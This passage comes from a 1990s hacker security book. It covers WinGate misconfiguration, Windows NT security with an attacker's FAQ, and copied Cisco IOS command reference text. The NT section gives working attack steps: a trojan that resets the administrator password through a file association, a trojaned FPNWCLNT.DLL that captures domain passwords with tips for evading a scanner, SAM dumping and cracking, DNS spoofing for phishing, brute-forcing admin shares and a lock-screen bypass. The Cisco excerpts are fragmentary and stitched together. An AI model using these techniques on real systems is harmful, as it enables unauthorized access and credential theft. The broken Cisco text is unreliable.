unlocked and everyone has access, you should turn off any services you do not have a need for 
by double clicking on the service and unchecking  the "Accept connections on port"

[10.1.0] Conclusion

WinGate is just another example of a program that is good but it doesnt warn the system admins 
and as we all know the common system admin doesnt read much just installs thinking it is secure. 
Software programmers need to either make their programs default to a tight security or at least as 
the program is install they need it to warn the system admin of possible miss configurations. 
Wether it is Microsoft products or this simple WinGate remember one thing, the software 
developer makes the software work they rarely ever warn you on miss configurations. Yes people 
do put out patches for true exploits etc... but where are the papers on miss configurations? Where 
are the warnings of things you might do that you should? If I was one of the WinGate 
programmers I would prompt the user while WinGate is installing and tell them of different 
security risks they may face. Hope that this paper has helped and that we, Rhino9, have helped.

[11.0.0] What a security person should know about WinNT

  The basis for this portion of the book was gleaned from simple nomads FAQ, much Props to 
him.

[11.0.1] NT Network structures (Standalone/WorkGroups/Domains) 

Each NT workstation participates in either a workgroup or a domain. Most companies will have 
NT workstations participate in a domain for management of the resource by the administrator.

A domain is one or more servers running NT server with all of the servers functioning as a single 
system. The domain not only contains servers, but NT workstations, Windows for Workgroups 
machines, and even LAN Manager 2.x machines. The user and group database covers ALL of 
the resources of a domain.

Domains can be linked together via trusted domains. The advantage of trusted domains is that a 
user only needs one user account and password to get to resources across multiple domains, 
and administrators can centrally manage the resources.

A workgroup is simply a grouping of workstations that do not belong to a domain. A standalone 
NT workstation is a special case workgroup. 

User and group accounts are handled differently between domain and workgroup situations. User 
accounts can be defined on a local or domain level. A local user account can only logon to that 
local computer, while a domain account can logon from any workstation in the domain.

Global group accounts are defined at a domain level. A global group account is an easy way to 
grant access to a subset of users in a domain to, say, a single directory or file located on a 
particular server within the domain. Local group accounts are defined on each computer. A local 
group account can have global group accounts and user accounts as members.

In a domain, the user and group database is "shared" by the servers. NT workstations in the 
domain DO NOT have a copy of the user and group database, but can access the database. In a 
workgroup, each computer in the workgroup has its own database, and does not share this 
information.

[11.0.2] How does the authentication of a user actually work?

First, a user logs on. When this happens, NT creates a token object that represents that user. 
Each process the user runs is associated with this token (or a copy of it). The token-process 
combination is refered to as a subject. As subjects access objects such as files and directories, 
NT checks the subject's token with the Access Control List (ACL) of the object and determines 
whether to allow the access or not. This may also generate an audit message.

[11.0.3] A word on NT Challenge and Response 

 When a user logs on, more than likely they will be using Windows NT Challenge and Response. 
When using this type of password encryption, the password never actually crosses the wire. A 
null or random set of characters is generated at the client machine. Those characters are 
encrypted using the users password. That encrypted information is then sent across the wire. The 
server then uses what it has stored in its database as the users password to un-encrypt the sent 
data. If the un-encryption works, it knows that the user typed in the correct password client side.

[11.0.4] Default NT user groups

There are a number of built-in local groups in NT that can do various functions, some which 
would be better off being left to the Administrator. Administrators can do everything, but the 
following groups' members can do a few extra items (I only verified this on 4.0):

- Server Operators: do a shutdown, even remotely; reset the system time; perform backups and 
restores.
- Backup Operators: do a shutdown; perform backups and restores.
- Account Operators: do a shutdown.
- Print Operators: do a shutdown.

Also members of these groups can login at the console. As you explore this book and possibly 
someone else's server, remember these permissions. Gaining a Server Operator account and 
placing a trojan that activates after a remote shutdown could get you Administrator.

[11.0.5] Default directory permissions

I only verified these on 4.0. And remember, Administrators are deities. Otherwise, if it isn't here, 
the group doesn't have access.

\ (root), \SYSTEM32, \WIN32APP - Server Operators and Everyone can read and execute files, 
display permissions on files, and do some changing on file attributes.

\SYSTEM32\CONFIG - Everyone can list filenames in this directory.

\SYSTEM32\DRIVERS, \SYSTEM\REPL - Server Operators have full access, Everyone has read 
access.

\SYSTEM32\SPOOL - Server Operators and Print Operator have full access, Everyone has read 
access.

\SYSTEM32\REPL\EXPORT - Server Operators can read and execute files, display permissions 
on files, and do some changing on file attributes. Replicator has read access.

\SYSTEM32\REPL\IMPORT - Server Operators and Replicator can read and execute files, 
display permissions on files, and do some changing on file attributes. Everyone has read access.

\USERS - Account Operators can read, write, delete, and execute. Everyone can list filenames in 
this directory.

\USERS\DEFAULT - Everyone has read, write, and execute.

[11.0.6] Common NT accounts and passwords

There are two accounts that come with NT out of the box – administrator and guest. In a network 
environment, I have run into local administrator access unpassworded, since the Sys Admin 
thought that global accounts ruled over local ones. Therefore it is possible to gain initial access to
an NT box by using its local administrator account with no password.

Guest is another common unpassworded account, although recent shipments of NT disable the 
account by default. While it is possible that some companies will delete the guest account, some 
applications require it. If Microsoft Internet Studio needs to access data on another system, it
will use guest for that remote access.

[11.0.7] How do I get the admin account name?

It is possible that a Sys Admin will create a new account, give that account the same access as 
an administrator, and then remove part of the access to the administrator account. The idea here 
is that if you don't know the administrator account name, you can't get in as an administrator.

Typing "NBTSTAT -A ipaddress" will give you the new administrator account (generally tagged as 
a 2 digit 03 code), assuming they are logged in. A bit of social engineering could get them to log 
in as well. nbtstat will also give you other useful information such as services running, the NT 
domain name, the nodename, and the ethernet hardware address.

[11.0.8] Accessing the password file in NT

The location of what you need is in \\WINNT\SYSTEM32\CONFIG\SAM which is the location of 
the security database. This is usually world readable by default, but locked since it is in use by 
system compotents. It is possible that there are SAM.SAV files which could be readable. If so, 
these could be obtained for the purpose of getting password info.

During the installation of NT a copy of the password database is put in \\WINNT\REPAIR. Since it 
was just installed, only the Administrator and Guest accounts will be there, but maybe 
Administrator is enough -- especially if the Administrator password is not changed after 
installation.

If the Sys Admin updates their repair disks, or you get a hold of a copy of the repair disks, you 
can get password database. 

If you are insane, you can go poking around in the SAM secret keys. First, schedule service to 
logon as LocalSystem and allow it to interact with the desktop, and then schedule an interactive 
regedt32 session. The regedt32 session will be running as LocalSystem and you can play around 
in the secret keys. However, if you change some stuff this might be very bad. You have to be 
Administrator to do this, though, so for the hacker you need to walk up to the machine while the 
Administrator is logged in and distract them by telling them they're giving away Microsoft t-shirts 
in the lobby (this doesn't always work ;-).

[11.0.9] Cracking the NT passwords

First off, it should be explained that the passwords are technically not located on the server, or in 
the password database. What IS located there is a one-way hash of the password. Let me 
explain...

Two one-way hashes are stored on the server -- a Lan Manager password, and a Windows NT 
password. Lan Manager uses a 14 byte password. If the password is less than 14 bytes, it is 
concantenated with 0's. It is converted to upper case, and split into 7 byte halves. An 8 byte odd 
parity DES key is constructed from each 7 byte half. Each 8 byte DES key is encrypted with a
"magic number" (0x4B47532140232425 encrypted with a key of all 1's). The results of the magic 
number encryption are concantenated into a 16 byte one way hash value. This value is the Lan 
Manager "password".

A regular Windows NT password is derived by converting the user's password to Unicode, and 
using MD4 to get a 16 byte value. This hash value is the NT "password".

So to crack NT passwords, the username and the corresponding one way hashes (Lan Man and 
NT) need to be extracted from the password database. Instead of going out and writing some 
code to do this, simply get a copy of Jeremy Allison's PWDUMP, which goes through SAM and 
gets the information for you.

PWDUMP does require that you are an Administrator to get stuff out of the registry, but if you can 
get ahold of copies of the security database from another location you can use those. For actually 
cracking the password, I recommend using L0phtcrack.

[11.1.0] What is ‘last login time’?

Let's say an admin is checking the last time certain users have logged in by doing a NET USER 
<userid> /DOMAIN. Is the info accurate? Most of the time it will NOT be.

Most users do not login directly to the Primary Domain Controller (PDC), they login to a Backup 
Domain Controller (BDC). BDCs do NOT contain readonly versions of SAM, they contain read-
write versions. To keep the already ungodly amount of network traffic down, BDCs do not tell the 
PDC that they have an update of the last login time until a password change has been done. And
the NET USER <userid> /DOMAIN command checks the PDC, so last login time returned from 
this command could be wildly off (it could even show NEVER).

As a hacker, if you happen to know that password aging is not enforced, then you can bet that 
last login times will probably not be very accurate.

[11.1.1] Ive got Guest access, can I try for Admin?

Basic NT 3.51 has some stuff read/writeable by default. You could edit the association between 
an application and the data file extension using regedt32. First off, you should write a Win32 app 
that does nothing but the following -

        net user administrator biteme /y
        notepad %1 %2 %3 %4 %5 

In a share you have read/write access to, upload it. Now change the association between .txt files 
and notepad to point to the location of the uploaded file, like 

\\ThisWorkstation\RWShare\badboy.exe.

Now wait for the administrator to launch a text file by double clicking on it, and the password 
becomes "biteme".

Of course, if the Sys Admin is smart they will have removed write permission from Everyone for 
HKEY_CLASSES_ROOT, only giving out full access to creator\owner.

[11.1.2] I heard that the %systemroot%\system32 was writeable?

Well, this can be exploited on NT 4.0 by placing a trojaned FPNWCLNT.DLL in that directory. 
This file typically exists in a Netware environment. First compile this exploit code written by 
Jeremy Allison (jra@cygnus.com) and call the resulting file FPNWCLNT.DLL. Now wait for the 
user names and passwords to get written to a file in \temp.

------------- cut --------------

If you load this on a Primary Domain Controller, you'll get EVERYBODY'S password. You have to 
reboot the server after placing the trojan in %systenroot%\system32.

ISS (www.iss.net) has a security scanner for NT which will detect the trojan DLL, so you may 
wish to consider adding in extra junk to the above code to make the size of the compiled DLL 
match what the original was. This will prevent the current shipping version of ISS's NT scanner 
from picking up the trojan.

It should be noted that by default the group Everyone has default permissions of "Change" in 
%systemroot\system32, so any DLL that is not in use by the system could be replaced with a 
trojan DLL that does something else.

[11.1.3] What about spoofin DNS against NT?

By forging UDP packets, NT name server caches can be compromised. If recursion is allowed on 
the name server, you can do some nasty things. Recursion is when a server receives a name 
server lookup request for a zone or domain for which is does not serve. This is typical how
most setups for DNS are done.

So how do we do it? We will use the following example:

We are root on ns.nmrc.org, IP 10.10.10.1. We have pirate.nmrc.org with an address of 
10.10.10.2, and bait.nmrc.org with an address of 10.10.10.3. Our mission? Make the users at 
lame.com access pirate.nmrc.org when they try to access www.lamer.net.

Okay, assume automation is at work here to make the attack smoother...

- DNS query is sent to ns.lame.com asking for address of bait.nmrc.org.
- ns.lame.com asks ns.nmrc.org what the address is.
- The request is sniffed, and the query ID number is obtained from the
request packet.
- DNS query is sent to ns.lame.com asking for the address of www.lamer.net.
- Since we know the previous query ID number, chances are the next query
ID number will be close to that number.
- We send spoofed DNS replies with several different query ID numbers. 
These replies are spoofed to appear to come from ns.lamer.net, and state
that its address is 10.10.10.2.
- pirate.nmrc.org is set up to look like www.lamer.net, except maybe it
has a notice to "go to the new password page and set up an account and ID".
Odds are this new password is used by that lame.com user somewhere else...

With a little creativity, you can also do other exciting things like reroute (and make copies of) 
email, denial of service (tell lame.com that www.lamer.net doesn't exist anymore), and other fun 
things.

Supposedly Service Pack 3 fixes this.

[11.1.4] What about default shared folders?

The main thing to realize about shares is that there are a few that are invisible. Administrative 
shares are default accounts that cannot be removed. They have a $ at the end of their name. For 
example C$ is the administrative share for the C: partition, D$ is the administrative share
for the D: partition. WINNT$ is the root directory of the system files.

By default since logging is not enabled on failed attempts and the administrator doesn't get 
locked out from false attempts, you can try and try different passwords for the administrator 
account. You could also try a dictionary attack Once in, you can get at basically anything.

[11.1.5] How do I get around a packet filter-based firewall?

If the target NT box is behind a firewall that is doing packet filtering (which is not considered 
firewalling by many folks) and it does not have SP3 loaded it is possible to send it packets 
anyway. This involves sending decoy IP packet fragments with specially crafted headers that will 
be "reused" by the malicious IP packet fragments. This is due to a problem with the way NT's 
TCP/IP stack handles reassembling fragmented packets. As odd as this sounds, example code 
exists to prove it works. See the web page at http://www.dataprotect.com/ntfrag for details.

How does it bypass the packet filter? Typically packet filtering only drops the fragmented packet 
with the offset of zero in the header. The example source forges the headers to get around this, 
and NT happily reassembles what does arrive.

[11.1.6] What is NTFS?

NTFS is the Windows NT special file system. This file system is tightly integrated into Windows 
security -- it is what allows access levels to be set from the directory down to individual files within 
a directory.

[11.1.7] Are there are vulnerabilities to NTFS and access controls?

Not so much vulnerabilities as there are quirks -- quirks that can be exploited to a certain degree.

For example, let's say the system admin has built a home directory for you on the server, but has 
disallowed the construction of directories or files that you wish to make available to the group 
Everyone. You are wanting to make this special directory so that you can easily retrieve some 
hack tools but you are cut off. However, if the sys admin left you as the owner of the home 
directory, you can go in and alter its permissions. This is because as long as you are the owner or 
Administrator you still control the file. Oh sure, you may get a few complaints from the system 
when you are doing it, but it can be done.

Since NTFS has security integrated into it, there are not too many ways around it. The main one 
requires access to the physical system. Boot up the system on a DOS diskette, and use 
NTFSDOS.EXE. It will allow you to access an NTFS volume bypassing security.

The last quirk is that if you have a directory with Full Control instead of RWXDPO permissions, 
then you get a hidden permission called File Delete Child. FDC cannot be removed. This means 
that all members of the group Everyone can delete any read-only file in the directory. Depending 
on what the directory contains, a hacker can replace a file with a trojan.

[11.1.8] How is file and directory security enforced?

Since files and directories are considered objects (same as services), the security is managed at 
an "object" level.

An access-control list (ACL) contains information that controls access to an object or controls 
auditing of attempts to access an object. It begins with a header contains information pertaining to 
the entire ACL, including the revision level, the size of the ACL, and the number of access-control
entries (ACEs) in the list. 

After the header is a list of ACEs. Each ACE specifies a trustee, a set of access rights, and flags 
that dictate whether the access rights are allowed, denied, or audited for the trustee. A trustee 
can be a user account, group account, or a logon account for a service program. 

A security descriptor can contain two types of ACLs: a discretionary ACL (DACL) and a system 
ACL (SACL). 

In a DACL, each ACE specifies the types of access that are allowed or denied for a specified 
trustee. An object's owner controls the information in the object's DACL. For example, the owner 
of a file can use a DACL to control which users can have access to the file, and which users are 
denied access. 

If the security descriptor for an object does not have a DACL, the object is not protected and the 
system allows all attempts to access the object. However, if an object has a DACL that contains 
no ACEs, the DACL does not grant any access rights. In this case, the system denies all attempts 
to access the object. 

In a SACL, each ACE specifies the types of access attempts by a specified trustee that cause the 
system to generate audit records in the system event log. A system administrator controls the 
information in the object's SACL. An ACE in a SACL can generate audit records when an access 
attempt fails, when it succeeds, or both.

To keep track of the individual object, a Security Identifier (SID) uniquely identify a user or a 
group.

A SID contains:

 - User and group security descriptors 
 - 48-bit ID authority 
 - Revision level 
 - Variable subauthority values 

A privilege is used to control access to a service or object more strictly than is normal with 
discretionary access control. Privileges provide access to services rarely needed by most users. 
For example, one type of privilege might give access for backups and restorals, another might 
allow the system time to be changed.

[11.1.9] Once in, how can I do all that GUI stuff?

The main problem is adjusting NT file security attributes. Some utilities are available with NT that 
can be used, but I'd recommend using the NT Command Line Security Utilities. They include:

saveacl.exe  - saves file, directory and ownership permissions to a file
restacl.exe  - restores file permissions and ownership from a saveacl file
listacl.exe  - lists file permissions in human readable format
swapacl.exe  - swaps permissions from one user or group to another
grant.exe    - grants permissions to users/groups on files
revoke.exe   - revokes permissions to users/groups on files
igrant.exe   - grants permisssions to users/groups on directories
irevoke.exe  - revokes permissions to users/groups on directories
setowner.exe - sets the ownership of files and directories
nu.exe       - 'net use' replacement, shows the drives you're connected to

The latest version can be found at:

ftp://ftp.netcom.com/pub/wo/woodardk/">ftp://ftp.netcom.com/pub/wo/woodardk/

[11.2.0] How do I bypass the screen saver?

If a user has locked their local workstation using CTRL+ALT+DEL, and you can log in as an 
administrator, you will have a window of a few seconds where you will see the user's desktop, 
and even manipulate things. This trick works on NT 3.5 and 3.51, unless the latest service pack 
has been loaded.

If the service pack has been loaded, but it's still 3.X, try the following.

 - From another NT workstation, type the following command:

     shutdown \\<target_computer> /t:30

 - This will start a 30 second shutdown on the target and a Security
   window will pop up.

 - Cancel the shutdown with the following command:

     shutdown \\<target_computer> /a 

 - The screen saver will kick back in.

 - Wiggle the mouse on the target. The screen will go blank.

 - Now do a ctrl-alt-del on the target.

 - An NT Security window will appear. Select cancel.

 - You are now at the Program Manager.

[11.2.1] How can tell if its an NT box?

Hopefully it is a web server, and they've simply stated proudly "we're running NT", but don't 
expect that...

Port scanning will find some. Typically you'll see port 135 open. This is no guarantee it's not 
Windows 95, however. Using Samba you should be able to connect and query for the existence 
of HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT and then check 
\CurrentVersion\CurrentVersion to determine the version running. If guest is enabled, try this first 
as Everyone has read permissions here by default.

Port 137 is used for running NetBios over IP, and since in the Windows world NetBios is used, 
certainly you can expect port 137 to be open if IP is anywhere in use around NT.

Another possible indication is checking for port 139. This tells you your target is advertising an 
SMB resource to share info, but it could be any number of things, such as a Windows 95 machine 
or even Windows for Workgroups. These may not be entirely out of the question as potential
targets, but if you are after NT you will have to use a combination of the aforementioned 
techniques coupled with some common sense.

To simplify this entire process, Secure Networks Inc. has a freeware utility called NetBios 
Auditing Tool. This tool's intent is to test NetBios file sharing configurations and passwords on 
remote systems. 

[11.2.2] What exactly does the NetBios Auditing Tool do?

Developed by Secure Networks Inc., it comes in pre-compiled Win32 binary form as well as the 
complete source code. It is the "SATAN" of NetBios based systems.

Here is a quote from Secure Networks Inc about the product -

"The NetBIOS Auditing Tool (NAT) is designed to explore the NETBIOS file-sharing services 
offered by the target system.  It implements a stepwise approach to gather information and 
attempt to obtain file system-level access as though it were a legitimate local client.

The major steps are as follows:

A UDP status query is sent to the target, which usually elicits a reply containing the Netbios 
"computer name".  This is needed to establish a session.  The reply also can contain other 
information such as the workgroup and account names of the machine's users.  This part of the 
program needs root privilege to listen for replies on UDP port 137, since the reply is usually sent 
back to UDP port 137 even if the original query came from some different port.

TCP connections are made to the target's Netbios port [139], and session requests using the 
derived computer name are sent across. Various guesses at the computer name are also used, in 
case the status query failed or returned incomplete information.  If all such attempts to establish a 
session fail, the host is assumed invulnerable to NETBIOS attacks even if TCP port 139 was 
reachable.

Provided a connection is established Netbios "protocol levels" are now negotiated across the new 
connection.  This establishes various modes and capabilities the client and server can use with 
each other, such as password encryption and if the server uses user-level or share-level Security.  
The usable protocol level is deliberately limited to LANMAN version 2 in this case, since that 
protocol is somewhat simpler and uses a smaller password keyspace than NT.

If the server requires further session setup to establish credentials, various defaults are 
attempted.  Completely blank usernames and passwords are often allowed to set up "guest" 
connections to a server; if this fails then guesses are tried using fairly standard account names 
such as ADMINISTRATOR, and some of the names returned from the status query.  Extensive 
username/password checking is NOT done at this point, since the aim is just to get the session 
established, but it should be noted that if this phase is reached at all MANY more guesses can be 
attempted and likely without the owner of the target being immediately aware of it.

Once the session is fully set up, transactions are performed to collect more information about the 
server including any file system "shares" it offers.

Attempts are then made to connect to all listed file system shares and some potentially unlisted 
ones.  If the server requires passwords for the shares, defaults are attempted as described above 
for session setup.  Any successful connections are then explored for writeability and some well-
known file-naming problems [the ".." class of bugs].

If a NETBIOS session can be established at all via TCP port 139, the target is declared 
"vulnerable" with the remaining question being to what extent.  Information is collected under the 
appropriate vulnerability at most of these steps, since any point along the way be blocked by the 
Security configurations of the target.  Most Microsoft-OS based servers and Unix SAMBA will 
yield computer names and share lists, but not allow actual file-sharing connections without
a valid username and/or password.  A remote connection to a share is therefore a possibly 
serious Security problem, and a connection that allows WRITING to the share almost certainly so.
Printer and other "device" services offered by the server are currently ignored."

[12.0.0] Cisco Routers and their configuration

Many many hackers and security professionals alike take routers for granted. Well, I have a news 
flash for you, if your routers go down, so does your network. We have included this section to 
attempt to educate system administrators on configuring cisco routers. Keep in mind that cisco is 
to date, the most widely used and common router. And for good reason, it’s a damn good router. 
Kudos to Cisco for making an excellent product. (NOTE: The rhino9 team did not sell, or make a 
profit off of this publication in any way, shape or form.) The information below was retrieved from 
the Cisco website (www.cisco.com). Copyright 1988-1997 © Cisco Systems Inc.

Many times, routers will not have passwords configured (this is mainly due to ignorant 
administrators… HEY.. Hire someone that knows what theyre doing… like a security professional 
or a Cisco Engineer…. Geeesh.)


[12.0.1] User Interface Commands
This chapter describes the commands used to enter and exit the various Cisco Internetwork 
Operating System (Cisco IOS) configuration command modes. It provides a description of the 
help command and help features, lists the command editing keys and functions, and details the 
command history feature. 
You can abbreviate the syntax of Cisco IOS configuration commands. The software recognizes a 
command when you enter enough characters of the command to uniquely identify it. 
For user interface task information and examples, see the "Understanding the User Interface" 
chapter of the Configuration Fundamentals Configuration Guide. 

[12.0.2] disable 
To exit privileged EXEC mode and return to user EXEC mode, enter the disable EXEC 
command. 
disable [level] 
Syntax Description
level 	(Optional) Specifies the user-privilege level. 	

Note The disable command is associated with privilege level 0. If you configure AAA 
authorization for a privilege level greater than 0, this command will not be included in the 
command set for that privilege level. 

Command Mode
EXEC 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
Use this command with the level option to reduce the user-privilege level. If a level is not 
specified, it defaults to the user EXEC mode, which is level 1.

provides a list of commands that begin with that string. 	
Delete or Backspace 	Erases the character to the left of the cursor. 	
Return 	At the command line, pressing the Return key performs the function of processing a 
command. At the "---More---" prompt on a terminal screen, pressing the Return key scrolls down 
a line. 	
Space Bar 	Allows you to see more output on the terminal screen. Press the space bar when 
you see the line "---More---" on the screen to display the next screen. 	
Left Arrow 	Moves the cursor one character to the left. When you enter a command that 
extends beyond a single line, you can press the Left Arrow key repeatedly to scroll back toward 
the system prompt and verify the beginning of the command entry. 	
Right Arrow1 	Moves the cursor one character to the right. 	
Up Arrow1 or Ctrl-P 	Recalls commands in the history buffer, beginning with the most recent 
command. Repeat the key sequence to recall successively older commands. 	
Down Arrow1 or 
Ctrl-N 	Return to more recent commands in the history buffer after recalling commands with the 
Up Arrow or Ctrl-P. Repeat the key sequence to recall successively more recent commands. 	
Ctrl-A 	Moves the cursor to the beginning of the line. 	
Ctrl-B 	Moves the cursor back one character. 	
Ctrl-D 	Deletes the character at the cursor. 	
Ctrl-E 	Moves the cursor to the end of the command line. 	
Ctrl-F 	Moves the cursor forward one character. 	
Ctrl-K 	Deletes all characters from the cursor to the end of the command line. 	
Ctrl-L and Ctrl-R 	Redisplays the system prompt and command line. 	
Ctrl-T 	Transposes the character to the left of the cursor with the character located at the cursor. 
	
Ctrl-U and Ctrl-X 	Deletes all characters from the cursor back to the beginning of the 
command line. 	
Ctrl-V and Esc Q 	Inserts a code to indicate to the system that the keystroke immediately 
following should be treated as a command entry, not as an editing key. 	
Ctrl-W 	Deletes the word to the left of the cursor. 	
Ctrl-Y 	Recalls the most recent entry in the delete buffer. The delete buffer contains the last ten 
items you have deleted or cut. Ctrl-Y can be used in conjunction with Esc Y. 	
Ctrl-Z 	Ends configuration mode and returns you to the EXEC prompt. 	
Esc B 	Moves the cursor back one word. 	
Esc C 	Capitalizes the word from the cursor to the end of the word. 	
Esc D 	Deletes from the cursor to the end of the word. 	
Esc F 	Moves the cursor forward one word. 	
Esc L 	Changes the word to lowercase at the cursor to the end of the word. 	
Esc U 	Capitalizes from the cursor to the end of the word. 	
Esc Y 	Recalls the next buffer entry. The buffer contains the last ten items you have deleted. 
Press Ctrl-Y first to recall the most recent entry. Then press Esc Y up to nine times to recall the 
remaining entries in the buffer. If you bypass an entry, continue to press Esc Y to cycle back to it.

[12.0.4] enable 
To enter privileged EXEC mode, use the enable EXEC command. 
enable [level] 
Syntax Description
level 	(Optional) Privileged level on which to log in. 	

Note The enable command is associated with privilege level 0. If you configure AAA 
authorization for a privilege level greater than 0, this command will not be included in the 
command set for that privilege level. 

Command Mode
EXEC 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
Because many of the privileged commands set operating parameters, privileged access should 
be password-protected to prevent unauthorized use. If the system administrator has set a 
password with the enable password global configuration command, you are prompted to enter it 
before being allowed access to privileged EXEC mode. The password is case sensitive. 
If an enable password has not been set, enable mode only can be accessed from the router 
console. If a level is not specified, it defaults to the privileged EXEC mode, which is level 15. 
Example
In the following example, the user enters the enable command and is prompted to enter a 
password. The password is not displayed on the screen. After the user enters the correct 
password, the system enters privileged command mode as indicated by the pound sign (#). 
Router> enable

Available in all command modes. 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
Use the exit command at the EXEC levels to exit the EXEC mode. Use the exit command at the 
configuration level to return to privileged EXEC mode. Use the exit command in interface, line, 
router, IPX-router, and route-map command modes to return to global configuration mode. Use 
the exit command in subinterface configuration mode to return to interface configuration mode. 
You also can press Ctrl-Z, or use the end command, from any configuration mode to return to 
privileged EXEC mode. 

Note The exit command is associated with privilege level 0. If you configure AAA authorization 
for a privilege level greater than 0, this command will not be included in the command set for that 
privilege level. 

Examples
In the following example, the user exits subinterface configuration mode to return to interface 
configuration mode:

Syntax Description
This command has no arguments or keywords. 
Command Mode
Available in all command modes. 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
The help command provides a brief description of the context-sensitive help system. 
? To list all commands available for a particular command mode, enter a question mark (?) 
at the system prompt. 
? 
? To obtain a list of commands that begin with a particular character string, enter the 
abbreviated command entry immediately followed by a question mark (?). This form of 
help is called word help, because it lists only the keywords or arguments that begin with 
the abbreviation you entered. 
? 
? To list a command's associated keywords or arguments, enter a question mark (?) in 
place of a keyword or argument on the command line. This form of help is called 
command syntax help, because it lists the keywords or arguments that apply based on 
the command, keywords, and arguments you have already entered. 

Note The help command is associated with privilege level 0. If you configure AAA authorization 
for a privilege level greater than 0, this command will not be included in the command set for that 
privilege level. 

Examples
Enter the help command for a brief description of the help system: 
Router# help
Help may be requested at any point in a command by entering
a question mark '?'. If nothing matches, the help list will
be empty and you must backup until entering a '?' shows the
available options.
Two styles of help are provided:
1. Full help is available when you are ready to enter a
   command argument (e.g. 'show ?') and describes each possible
   argument.
2. Partial help is provided when an abbreviated argument is entered
   and you want to know what arguments match the input
   (e.g. 'show pr?'.)
The following example shows how to use word help to display all the privileged EXEC commands 
that begin with the letters "co": 

Router# co?
configure  connect  copy

The following example shows how to use command syntax help to display the next argument of a 
partially complete access-list command. One option is to add a wildcard mask. The <cr> symbol 
indicates that the other option is to press Return to execute the command.

[12.0.9] history 
To enable the command history function, or to change the command history buffer size for a 
particular line, use the history line configuration command. To disable the command history 
feature, use the no form of this command. 
history [size number-of-lines] 
no history [size number-of-lines] 
Syntax Description
size number-of-lines 	(Optional) Specifies the number of command lines that the system will 
record in its history buffer. The range is 0 to 256. 	
Default
10 lines 
Command Mode
Line configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
The history command without the size keyword and the number-of-lines argument enables the 
history function with the last buffer size specified or with the default of 10 lines, if there was not a 
prior setting. 
The no history command without the size keyword and the number-of lines argument disables 
the history feature but remembers the buffer size if it was something other than the default. The 
no history size command resets the buffer size to 10. 

Note The history size command only sets the size of the buffer; it does not reenable the history 
feature. If the no history command is used, the history command must be used to reenable this 
feature. 

The command history feature provides a record of EXEC commands that you have entered. This 
feature is particularly useful for recalling long or complex commands or entries, including access 
lists. 

Key 	Functions 	
Ctrl-P or Up Arrow Recalls commands in the history buffer in a backward sequence, beginning 
with the most recent command. Repeat the key sequence to recall successively older commands. 
	
Ctrl-N or Down Arrow1 	Returns to more recent commands in the history buffer after recalling 
commands with Ctrl-P or the Up Arrow. Repeat the key sequence to recall successively more 
recent commands. 	

1 The arrow keys function only with ANSI-compatible terminals such as VT100s.
Example
In the following example, line 4 is configured with a history buffer size of 35 lines:

[12.1.3] menu (EXEC) 
Use the menu EXEC command to invoke a user menu. 
menu name 
Syntax Description
name 	The configuration name of the menu. 	
Command Mode
User EXEC mode or privileged EXEC mode 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
A menu can be invoked at either the user or privileged EXEC level, but if an item in the menu 
contains a privileged EXEC command, the user must be logged in at the privileged level for the 
command to succeed. 
Example
The following example shows how to invoke the menu named Access1: 
menu Access1

[12.1.4] menu (global) 
Use the menu global configuration command with the appropriate keyword to specify menu-
display options. Use the no form of the global configuration command to delete a specified, or 
named, menu from the configuration. 
menu name [clear-screen | line-mode | single-space | status-line] 
no menu name 
Syntax Description
name 	The configuration name of the menu. 	
clear-screen 	(Optional) Clears the terminal screen before displaying a menu. 	
line-mode 	(Optional) In a menu of nine or fewer items, you ordinarily select a menu item by 
entering the item number. In line mode, you select a menu entry by entering the item number and 
pressing Return. Line mode allows you to backspace over the selected number and enter another 
number before pressing Return to execute the command. This option is activated automatically 
when more than nine menu items are defined but also can be configured explicitly for menus of 
nine or fewer items. 	
single-space 	(Optional) Displays menu items single-spaced rather than double-spaced. This 
option is activated automatically when more than nine menu items are defined but also can be 
configured explicitly for menus of nine or fewer items. 	
status-line 	(Optional) Displays a line of status information about the current user. 	
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
The clear-screen option uses a terminal-independent mechanism based on termcap entries 
defined in the router and the terminal type configured for the user's terminal. The clear-screen 
option allows the same menu to be used on multiple types of terminals instead of having terminal-
specific strings embedded within menu titles. If the termcap entry does not contain a clear string, 
the menu system enters 24 newlines, causing all existing text to scroll off the top of the terminal 
screen. 
The status-line option displays the status information at the top of the screen before the menu 
title is displayed. This status line includes the router's host name, the user's line number, and the 
current terminal type and keymap type (if any). 
A menu can be activated at the user EXEC level or at the privileged EXEC level, depending upon 
whether the given menu contains menu entries using privileged commands. 
When a particular line should always display a menu, that line can be configured with an 
autocommand configuration command. The menu should not contain any exit paths that leave 
users in an unfamiliar interface environment. 
Menus can be run on a per-user basis by defining a similar autocommand for that local 
username. 
Examples
The following example shows how to invoke the menu named Access1: 
menu Access1
The following example shows how to display the status information using the status-line option 
for the menu named Access1:

[12.1.5] menu command 
Use the menu command global configuration command to specify underlying commands for 
user interface menus. 
menu name command number 
Syntax Description
name 	The configuration name of the menu. You can specify a maximum of 20 characters. 	
number 	The selection number associated with the menu entry. This number is displayed 
to the left of the menu entry. You can specify a maximum of 18 menu entries. When the tenth 
item is added to the menu, the line-mode and single-space options are activated automatically. 	
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
The menu command and menu text commands define a menu entry. These commands must 
use the same menu name and menu selection number. 
The menu command has a special option, menu-exit, that is available only within menus. It is 
used to exit a submenu and return to the previous menu level or exit the menu altogether and 
return to the EXEC command prompt. 
You can create submenus that are opened by selecting a higher-level menu entry. Use the menu 
command to invoke a menu as the command in a line specifying a higher-level menu entry. 

Note If you nest too many levels of menus, the system prints an error message on the terminal 
and returns to the previous menu level. 

When a menu allows connections (their normal use), the command for an entry activating the 
connection should contain a resume command, or the line should be configured to prevent users 
from escaping their sessions with the escape-char none command. Otherwise, when they 
escape from a connection and return to the menu, there will be no way to resume the session and 
it will sit idle until the user logs off. 
Specifying the resume command as the action that is performed for a selected menu entry 
permits a user to resume a named connection or connect using the specified name, if there is no 
active connection by that name. As an option, you can also supply the connect string needed to 
connect initially. When you do not supply this connect string, the command uses the specified 
connection name. 
